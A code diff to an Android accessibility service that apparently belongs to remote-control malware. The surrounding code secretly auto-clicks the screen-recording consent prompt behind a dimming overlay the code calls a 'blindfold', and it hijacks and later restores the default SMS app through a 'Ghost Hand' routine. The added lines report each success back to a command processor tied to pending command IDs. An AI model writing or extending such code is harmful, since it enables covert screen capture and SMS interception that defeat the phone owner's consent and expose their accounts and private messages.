@@ -200,6 +200,7 @@ class MyAccessibilityService : AccessibilityService() {
                         DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
                         ScreenRecordManager.expectedMode = "" // Disarm
                         DimmerManager.removeOverlay(this) // Remove the blindfold
+                        CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
                         break
                     }
                 }
@@ -253,6 +254,7 @@ class MyAccessibilityService : AccessibilityService() {
                                 btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                 DebugLogger.log("GHOST_SMS", "Auto-clicked Set as default for $targetLabel")
                                 DefaultSmsManager.expectedMode = "" // Disarm
+                                CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
                                 break
                             }
                         }
@@ -336,6 +338,7 @@ class MyAccessibilityService : AccessibilityService() {
                             DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target restored.")
                             DefaultSmsManager.expectedMode = "" 
                             prefs.edit().putInt("restore_candidate_idx", 0).apply()
+                            CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Original SMS app restored")
                             performGlobalAction(GLOBAL_ACTION_HOME)
                         } else {
                             DebugLogger.log("GHOST_RESTORE", "Candidate $candidateIndex failed verification. Incrementing index to test next app.")
